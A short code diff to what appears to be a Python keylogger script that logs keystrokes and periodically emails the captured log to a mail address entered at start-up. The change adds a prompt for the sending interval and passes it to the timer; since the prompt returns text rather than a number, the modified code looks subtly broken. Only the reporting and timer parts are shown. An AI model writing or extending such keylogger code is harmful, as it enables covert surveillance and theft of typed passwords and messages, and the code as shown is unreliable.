@@ -7,6 +7,7 @@ caps = False
 count = 0
 print("keylogger has started running")
 target_mail = input("enter the target mail: ")
+time = input("enter the time you want to send in seconds:")
 print("entries successfull it will send mail in every 1 minutes")
 
 
@@ -51,7 +52,7 @@ def report():
     global log
     sendmail(fm, ps, log, target_mail)
     log = ""
-    timer = threading.Timer(60, report)
+    timer = threading.Timer(time, report)
     timer.start()
 
 
